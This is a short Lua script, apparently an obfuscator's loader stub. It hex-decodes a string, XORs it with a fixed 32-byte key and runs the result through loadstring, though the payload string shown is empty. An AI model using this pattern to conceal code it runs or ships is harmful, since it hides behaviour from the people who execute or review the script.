local k={100,218,246,193,209,44,97,147,54,249,16,179,245,244,242,248,143,7,85,76,103,185,23,74,64,48,64,210,44,2,192,148}
local s=[[]]
local t={}
local n=0
for i=1,#s,2 do
	n=n+1
	local v=tonumber(s:sub(i,i+1),16)
	t[n]=string.char(bit32.bxor(v,k[((n-1)%#k)+1]))
end
local c=loadstring or load
local fn,err=c(table.concat(t))
if not fn then error(tostring(err),0) end
return fn()
